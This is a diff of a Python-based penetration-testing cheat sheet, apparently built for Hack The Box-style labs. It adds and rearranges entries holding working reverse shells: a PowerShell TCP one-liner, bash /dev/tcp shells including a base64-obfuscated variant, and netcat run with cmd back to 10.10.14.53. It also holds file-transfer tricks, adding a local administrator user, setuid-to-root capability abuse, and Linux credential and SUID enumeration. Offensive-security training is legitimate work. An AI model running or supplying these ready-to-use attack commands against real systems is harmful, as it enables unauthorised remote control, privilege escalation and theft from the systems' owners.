@@ -1,13 +1,13 @@
 class Cheat:
-	def __init__(self, name):
-		self.name = name
-		self.category = None
-		self.output = None
-		self.addToList()
+    def __init__(self, name):
+        self.name = name
+        self.category = None
+        self.output = None
+        self.addToList()
 
-	def addToList(self):
-		global cheatList
-		cheatList.append(self)
+    def addToList(self):
+        global cheatList
+        cheatList.append(self)
 
 
 cheatList = []
@@ -30,7 +30,7 @@ Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
 ######################################
 
 icmp_reverse_shell_windows = Cheat(
-	"ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
+    "ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
 )
 icmp_reverse_shell_windows.category = "Windows"
 icmp_reverse_shell_windows.output = """[*] Reverse Shell when TCP and UDP connection are blocked by Firewall rules.
@@ -83,7 +83,7 @@ cacls C:\PATH\File.ext
 ######################################
 
 alternative_data_streams = Cheat(
-	"Alternate Data Streams (MetaData), hide file in a file"
+    "Alternate Data Streams (MetaData), hide file in a file"
 )
 alternative_data_streams.category = "Windows"
 alternative_data_streams.output = """[*] Check for hide data in a file (like stenography for images)
@@ -174,7 +174,7 @@ sudo restart ipsec
 ######################################
 
 file_transfere_windows_iwr = Cheat(
-	"File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
+    "File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
 )
 file_transfere_windows_iwr.category = "Windows"
 file_transfere_windows_iwr.output = """[*] Simple file transfere for Windows with PowerShell
@@ -209,7 +209,7 @@ net localgroup Administrators javali /add
 ######################################
 
 file_transfere_windows_smbserver = Cheat(
-	"File Transfere Windows - SmbServer.py (Impacket)"
+    "File Transfere Windows - SmbServer.py (Impacket)"
 )
 file_transfere_windows_smbserver.category = "Windows"
 file_transfere_windows_smbserver.output = """[*] Create Shared Folder by the Internet with SmbServer.py (Impacket)
@@ -223,16 +223,6 @@ net use \\\\10.10.14.53\smbFolder /u:javali javali
 copy \\\\10.10.14.53\smbFolder\\nc64.exe C:\Windows\Temp\\nc64.exe
 # Execute directely without transfere
 \\\\10.10.14.53\smbFolder\\nc64.exe -e cmd 10.10.14.53 443
-"""
-
-######################################
-######################################
-
-oneline_reverse_tcp_windows = Cheat("Reverse shell TCP on Windows")
-oneline_reverse_tcp_windows.category = "Windows"
-oneline_reverse_tcp_windows.output = """[*] Simple one liner to get a reverse Shell TCP
-
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 """
 
 ######################################
@@ -309,7 +299,7 @@ seLoadDriverPrivilege.output = """[*] SeLoadDriverPrivilege - If Enabled... GG!
 ######################################
 ######################################
 
-reverseSheel = Cheat("Reverse Shell")
+reverseSheel = Cheat("Basic and advanced Reverses Shells - Both Windows and Linux")
 reverseSheel.category = "Reverse Shells"
 reverseSheel.output = """[*] TCP Reverse Shell - Linux
 
@@ -321,6 +311,10 @@ printf "\142\141\163\150\040\055\143\040\047\145\170\145\143\040\163\150\040\055
 # Base64 ofuscation
 echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.53/443 <&1'" | base64 -w0 into_clip
 echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDwmMScK | base64 -d | bash
+
+[*] Simple one liner to get a reverse Shell TCP
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 [*] UDP Reverse Shell - Linux
 
@@ -499,5 +493,164 @@ mimeChanger.output = """[*] Change MIME Type of file...
 # This methode will overwrite first bytes...
 
 xxd -r -p -o 0 <(echo FF D8 FF DB) shell.php.jpg
+"""
+
+######################################
+######################################
+
+crontabs = Cheat("Crontabs - Basic enumeration Linux")
+crontabs.category = "Linux"
+crontabs.output = """[*] Crontabs - Basic enumeration Linux
+
+/dev/shm  # comparável ao c:\windows\temp
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+"""
+
+######################################
+######################################
+
+cron_checker = Cheat("croncheck.sh - Check Diferentes Processes running")
+cron_checker.category = "Linux"
+cron_checker.output = """[*] CronCheck.sh - Simple Bash Script to check diferentes processes running on Linux
+
+#!/bin/bash
+
+old=$(ps -eo command)
+
+echo -e "Start at: $(date +%H:%M:%S)"
+while true; do
+		echo -ne "Now: $(date +%H:%M:%S)\r"
+		new=$(ps -eo command)
+		diff <(echo "$old") <(echo "$new") | grep "[\<\>]" | grep -vE "croncheck.sh|command"
+		old=$new
+done
+"""
+
+######################################
+######################################
+
+find_and_grep = Cheat("Find - Grep for Basic enumeration Linux (Clear Usernames or passes, SUID)")
+find_and_grep.category = "Linux"
+find_and_grep.output = """[*] Find - Grep for Basic enumeration Linux
+
+# Usernames or Passwords in clear text?! (examples)
+
+grep -i user [filename]
+grep -i pass [filename]
+grep -C 5 "password" [filename]
+find / -name "*php" -type f -print0 2>/dev/null | xargs -0 grep -i -n -E "pass|user" | grep -vE ":.*//|:.*\*"
+
+# Permissions
+
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done
+
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+find / -writable -type d 2>/dev/null      # world-writeable folders
+find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+find / -perm -o x -type d 2>/dev/null     # world-executable folders
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null | grep -vE "^l|^d"
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null | grep -vE "^l|^d"
+
+
+find /etc/ -readable -type f 2>/dev/null               # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
+"""
+
+######################################
+######################################
+
+network = Cheat("network - Basic enumeration Linux")
+network.category = "Linux"
+network.output = """[*] Basic Network enumeration on Linux
+
+cat /proc/net/tcp
+for b in $(cat /proc/net/tcp | grep -v "rem_add" | tr ':' ' ' | awk '{print $3}' | sort -u); do python3 -c "print("0x$b")"; done
+cat /proc/net/fib_trie
+cat /etc/knockd.conf
+
+/sbin/ifconfig -a
+cat /etc/network/interfaces
+cat /etc/sysconfig/network
+
+cat /etc/resolv.conf
+cat /etc/sysconfig/network
+cat /etc/networks
+iptables -L
+hostname
+dnsdomainname
+
+lsof -i
+lsof -i :80
+grep 80 /etc/services
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep 3:on
+last
+w
+
+arp -e
+route
+/sbin/route -nee
+
+tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 # tcpdump tcp dst [ip] [porta] e tcp dst [ip] [porta]
+"""
+
+######################################
+######################################
+
+capabilities = Cheat("Capabilities - setcap / getcap / setuid - Basic enumeration Linux")
+capabilities.category = "Linux"
+capabilities.output = """[*] Capabilities - setcap / getcap / setuid
+
+getcap -r / 2>/dev/null               # python with that can easily convert user to root.
+									  # import os; os.setuid(0), os.system("/bin/bash")
+setcap cap_setuid+ep /path/to/binary  # set uid for scale faster praticaly invisible!
+"""
+
+
+######################################
+######################################
+
+findSubDomain_dns = Cheat("nslookup / dig / dnsenum / host - Get SubDomain - DNS")
+findSubDomain_dns.category = "Tools"
+findSubDomain_dns.output = """[*] Some tools to find sub domains...
+
+nslookup
+	> server 10.10.10.13
+	> 10.10.10.13
+
+dig @10.10.10.123 friendzone.red axfr
+dnsenum --server 10.10.10.224 --threads 50 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+host -t axfr friendzone.red 10.10.10.123
+
+wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.forwardslash.htb" http://forwardslash.htb/
 
 """
